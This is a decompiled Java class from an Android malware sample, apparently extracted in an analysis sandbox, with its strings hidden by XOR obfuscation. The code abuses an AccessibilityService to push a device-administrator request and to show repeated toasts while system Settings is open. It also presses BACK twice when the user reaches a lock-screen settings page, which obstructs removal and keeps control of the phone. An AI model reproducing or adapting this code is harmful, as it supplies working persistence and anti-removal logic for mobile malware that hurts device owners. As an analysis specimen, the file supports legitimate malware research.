package com.zjxyxnvvp.nxvxchltf.i;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.g;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class e {
    private static short[] $ = {5021, 5014, 5023, 5008, 5017, 5019, 5025, 5006, 5023, 5005, 5005, 5970, 5981, 5975, 5953, 5980, 5978, 5975, 5917, 5970, 5955, 5955, 5917, 5970, 5968, 5959, 5978, 5980, 5981, 5917, 5984, 6006, 5991, 5996, 6013, 6006, 5988, 5996, 5987, 6002, 5984, 5984, 5988, 6012, 5985, 6007, 9532, 9523, 9529, 9519, 9522, 9524, 9529, 9587, 9532, 9517, 9517, 9587, 9528, 9509, 9513, 9519, 9532, 9587, 9485, 9500, 9486, 9486, 9482, 9490, 9487, 9497, 9474, 9502, 9490, 9488, 9485, 9489, 9496, 9477, 9492, 9481, 9476, 7173, 7191, 7195, 7173, 7171, 7192, 7185, 3693, 3706, 3692, 3690, 3699, 3691, 5230, 5186, 5184, 5213, 5185, 5192, 5209, 5192, 5193, 9897, 9893, 9895, 9956, 9899, 9892, 9902, 9912, 9893, 9891, 9902, 9956, 9913, 9903, 9918, 9918, 9891, 9892, 9901, 9913, 5328, 5340, 5342, 5277, 5330, 5341, 5335, 5313, 5340, 5338, 5335, 5277, 5312, 5334, 5319, 5319, 5338, 5341, 5332, 5312, 5277, 5315, 5330, 5312, 5312, 5316, 5340, 5313, 5335, 5277, 5360, 5339, 5340, 5340, 5312, 5334, 5375, 5340, 5328, 5336, 5347, 5330, 5319, 5319, 5334, 5313, 5341};

    /* renamed from: a  reason: collision with root package name */
    private static long f324a;

    /* renamed from: b  reason: collision with root package name */
    private static long f325b;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        CharSequence className;
        if (!UIDNwaidobaWIODb.k) {
            d dVar = d.e;
            p pVar = dVar.c;
            String $2 = $(0, 11, 5118);
            f b2 = pVar.b($2);
            if ((b2 != null && !b2.c()) || com.zjxyxnvvp.nxvxchltf.e.n.getAndSet(false)) {
                Intent addFlags = new Intent($(11, 46, 5939)).addFlags(268435456);
                addFlags.putExtra($(46, 83, 9565), 0);
                accessibilityService.startActivity(addFlags);
                Toast.makeText(accessibilityService, g.o(), 1).show();
                f324a = System.currentTimeMillis() + (Build.MANUFACTURER.toLowerCase().contains($(83, 90, 7286)) ? 180000 : 7000);
                JSONObject jSONObject = new JSONObject();
                try {
                    jSONObject.put($(90, 96, 3615), $(96, 105, 5165));
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                dVar.c.e($2, jSONObject);
            }
            if (accessibilityEvent.getPackageName() != null && accessibilityEvent.getPackageName().equals($(105, 125, 9930)) && System.currentTimeMillis() < f324a && System.currentTimeMillis() - f325b > 5000) {
                Toast.makeText(accessibilityService, g.o(), 1).show();
                f325b = System.currentTimeMillis();
            }
            if (UIDNwaidobaWIODb.p.get() && (className = accessibilityEvent.getClassName()) != null && className.toString().equals($(125, 172, 5299))) {
                accessibilityService.performGlobalAction(1);
                accessibilityService.performGlobalAction(1);
            }
        }
    }
}
